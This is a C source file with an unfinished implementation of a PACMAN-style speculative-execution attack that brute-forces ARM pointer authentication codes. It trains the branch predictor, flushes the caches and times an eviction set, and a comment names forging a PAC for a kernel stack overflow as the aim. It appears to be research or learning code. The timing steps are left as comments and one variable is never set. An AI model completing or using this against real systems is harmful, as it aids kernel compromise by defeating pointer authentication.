#include "pacman.h"
#include "cache.h"
#include "eviction_set.h"
#include "kmodule.h"
#include "memory.h"
#include "pac.h"
#include <stdbool.h>
#include <stddef.h>

// pacman_data_t pacman_data = {
//     .next_pac = 0,
//     .pac_checked_last = false,
// };

// MIT code (what's even the point of this. just do a loop)
// void *get_next_pac() {
//   PAC cur_pac = pacman_data.next_pac;

//   if (cur_pac == MAX_PAC) {
//     if (pacman_data.pac_checked_last) {
//       return NULL;
//     }
//     pacman_data.pac_checked_last = true;
//   } else {
//     pacman_data.next_pac++;
//   }

//   return pac_encode(pacman_data.cur_addr, cur_pac);
// }

void pacman_run() {
  addr_t cur_addr;
  PAC cur_pac;

  // Target address: this is what we want to sign with a forged PAC and
  // buf-overflow into the kernel call stack
  addr_t target_paddr = kmod_get_paddr();
  addr_t target_vaddr = kmod_get_vaddr();

  // Eviction set of virtual addresses for the kernel physical address
  eviction_set_t *evset = evset_v_for_paddr(target_paddr, NULL, 0);

  // Test all the PACs
  for (cur_pac = 0; cur_pac < MAX_PAC; ++cur_pac) {
    int i;
    // Train the branch predictor to take the PAC path
    for (i = 0; i < NUM_BRANCHPRED_TRAIN; i++) {
      // NULL <- trusted PAC-signed pointer
      kmod_data_gadget(true, NULL);
    }

    // Reset the cache
    cache_flush_l1d();
    // Are these necessary?
    // I think they are necessary...
    // helps increase the time of a cache miss
    // L1 -> L2 -> L3 -> DRAM instead of
    // L1 -> L2
    cache_flush_l2();
    cache_flush_l3();

    // Prime cache with eviction set

    // NULL <- guess pointer
    kmod_data_gadget(false, cur_addr);

    // Then, time the accesses of the eviction set
    // If it took significantly longer than before, PAC successful!
    // If not, try again with the next PAC
    // CONSIDER:
    // The Graviton CPU AWS is using has many many cores and the cache is
    // probably not shared but... the cpu info says that there is only one core
    // does the hypervisor divide the super-CPU into sub-CPUs? can it do that?
    // If so, can I treat all my cache as unified? Or can I only assume L3 is
    // unified? If only L3 is unified I have a big problem on my hands, because
    // then the difference between accessing L3 and DRAM will be much smaller
    // and much harder to differentiate than between L1 and DRAM
  }
}
